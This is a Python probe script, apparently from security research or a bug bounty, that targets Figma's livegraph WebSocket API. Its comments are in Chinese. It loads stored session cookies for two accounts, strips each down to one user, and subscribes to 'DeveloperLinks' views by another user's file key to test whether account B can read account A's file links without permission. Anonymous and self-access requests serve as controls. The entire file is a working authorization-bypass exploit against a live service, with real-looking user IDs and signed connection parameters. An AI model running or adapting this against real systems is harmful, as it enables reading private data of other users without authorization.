# -*- coding: utf-8 -*-
"""新攻击面: DeveloperLinks view (zu) -> root developerLinks 裸读通道
JS 定义: root developerLinks filter 仅按 key, 无 checkCanRead / 无 dZ 绑定
        DeveloperLink 类型 permissionRequired: DangerouslyExempt
矩阵:
  1. 纯净 A subscribe DeveloperLinks(key=A_design)  -> 基线 (A 自己文件)
  2. 纯净 B subscribe DeveloperLinks(key=A_design)  -> 核心! B 越权读 A 文件 links
  3. 匿名   subscribe DeveloperLinks(key=A_design)  -> 对照
  4. 纯净 B subscribe DeveloperLinks(key=B_FILE)     -> B 自己文件
  5. 纯净 B subscribe DeveloperRelatedLinksForNode(fileKey=A_design, nodeId=0:1) -> 节点级
  6. 纯净 A subscribe DeveloperRelatedLinks(key=A_design) -> zm 对照 (之前测过为空)
"""
import sys, json, io, asyncio, time
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
import websockets

A_UID = "1666382703778278399"
B_UID = "1667396392129259941"
A_DESIGN = "5Gs4PaTz11Hlk2sqVnidBG"
B_FILE = "xFETb3KJ8wh2U8wjD9jJeY"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"


def clean_json_cookie_field(raw_value, keep_uid):
    import urllib.parse
    v = urllib.parse.unquote(raw_value)
    try:
        d = json.loads(v)
    except Exception:
        return None
    if not isinstance(d, dict):
        return None
    nd = {k: val for k, val in d.items() if k == keep_uid}
    if not nd:
        return None
    return urllib.parse.quote(json.dumps(nd, separators=(",", ":")))


def make_abs_pure(cookie, keep_uid):
    import urllib.parse
    parts = {}
    for p in cookie.split("; "):
        if "=" in p:
            k, v = p.split("=", 1)
            parts[k] = v
    authn_raw = parts.get("__Host-figma.authn", "")
    d = json.loads(urllib.parse.unquote(authn_raw))
    d = {k: v for k, v in d.items() if k == keep_uid}
    parts["__Host-figma.authn"] = urllib.parse.quote(json.dumps(d, separators=(",", ":")))
    if "__Host-figma.embed" in parts:
        ne = clean_json_cookie_field(parts["__Host-figma.embed"], keep_uid)
        if ne:
            parts["__Host-figma.embed"] = ne
        else:
            del parts["__Host-figma.embed"]
            parts.pop("__Host-figma.embed.mac", None)
    return "; ".join(f"{k}={v}" for k, v in parts.items())


rawB = io.open("ws_cookie_B_new.txt", encoding="utf-8").read().strip().replace("\n", "; ")
rawA = io.open("ws_cookie_A_new.txt", encoding="utf-8").read().strip().replace("\n", "; ")
ABS_A = make_abs_pure(rawA, A_UID)
ABS_B = make_abs_pure(rawB, B_UID)
print(f"ABS_A 含A={A_UID in ABS_A} 含B={B_UID in ABS_A}")
print(f"ABS_B 含B={B_UID in ABS_B} 含A={A_UID in ABS_B}")


def lg_url(fk, uid):
    return (f"wss://www.figma.com/api/livegraph?pv=1&pr=251c5be83e6853e5&pt=1786072093"
            f"&ph=sb9dUg8LQV0WGY29b-j8nggmhGX8TR2vghWs-rNzbds&userId={uid}&anonUserId="
            f"&clientType=web&commitHash=5848603c50c1ee154ea6a1fe5ee3aab3791c5b48"
            f"&preload=%7B%7D&requestedProtocolVersion=2"
            f"&clientUrl=https%3A%2F%2Fwww.figma.com%2Ffile%2F{fk}"
            f"&connectionType=initial&reconnect=0")


async def probe(label, cookie, uid, fk, view, args, wait=10):
    frames = []
    try:
        async with websockets.connect(lg_url(fk, uid),
                                      additional_headers={"User-Agent": UA, "Cookie": cookie,
                                                          "Origin": "https://www.figma.com"},
                                      max_size=50_000_000, open_timeout=15) as ws:
            await ws.send(json.dumps({"messageType": "auth", "clientType": "web",
                                      "args": {"userId": uid, "anonymousUserId": None},
                                      "tags": {"clientType": "web",
                                               "commitHash": "81855c2bc7c604648169c4e4333f43579bfa7464",
                                               "clientUrl": f"https://www.figma.com/file/{fk}"},
                                      "clientRequestedVersion": 2}))
            au = None
            for _ in range(3):
                m = await asyncio.wait_for(ws.recv(), timeout=8)
                if isinstance(m, str) and "authSuccess" in m:
                    au = json.loads(m).get("userId")
                    break
            await ws.send(json.dumps({"messageType": "subscribe", "viewName": view,
                                      "viewHash": "f" * 32, "loadType": "initial",
                                      "args": args}))
            deadline = time.time() + wait
            while time.time() < deadline:
                try:
                    m = await asyncio.wait_for(ws.recv(), timeout=3)
                except asyncio.TimeoutError:
                    continue
                if isinstance(m, str):
                    frames.append(m)
                    if "viewLoaded" in m:
                        break
    except Exception as e:
        print(f"[{label}] ❌ {type(e).__name__}: {str(e)[:90]}")
        return
    print(f"[{label}] authUserId={au} 帧数={len(frames)}")
    for f in frames:
        if "linkName" in f or "linkUrl" in f or "developerLinks" in f or "DeveloperRelatedLink" in f:
            print(f"  🖼 {f[:2000]}")
        elif "viewLoaded" in f or "error" in f.lower() or "noPermission" in f:
            print(f"  ℹ {f[:400]}")


async def main():
    print("=" * 72)
    print("1. 纯净A -> DeveloperLinks(key=A_design) 基线")
    await probe("纯净A-zu基线", ABS_A, A_UID, A_DESIGN, "DeveloperLinks", {"key": A_DESIGN})
    print("=" * 72)
    print("2. 纯净B -> DeveloperLinks(key=A_design) 核心!")
    await probe("纯净B-zu越权", ABS_B, B_UID, A_DESIGN, "DeveloperLinks", {"key": A_DESIGN})
    print("=" * 72)
    print("3. 匿名 -> DeveloperLinks(key=A_design) 对照")
    await probe("匿名-zu", "", "0", A_DESIGN, "DeveloperLinks", {"key": A_DESIGN})
    print("=" * 72)
    print("4. 纯净B -> DeveloperLinks(key=B_FILE) 自己文件")
    await probe("纯净B-zu自己", ABS_B, B_UID, B_FILE, "DeveloperLinks", {"key": B_FILE})
    print("=" * 72)
    print("5. 纯净B -> DeveloperRelatedLinksForNode(A_design, 0:1) 节点级")
    await probe("纯净B-zp", ABS_B, B_UID, A_DESIGN, "DeveloperRelatedLinksForNode",
                {"fileKey": A_DESIGN, "nodeId": "0:1"})
    print("=" * 72)
    print("6. 纯净A -> DeveloperRelatedLinks(key=A_design) zm 对照")
    await probe("纯净A-zm", ABS_A, A_UID, A_DESIGN, "DeveloperRelatedLinks", {"fileKey": A_DESIGN})


asyncio.run(main())
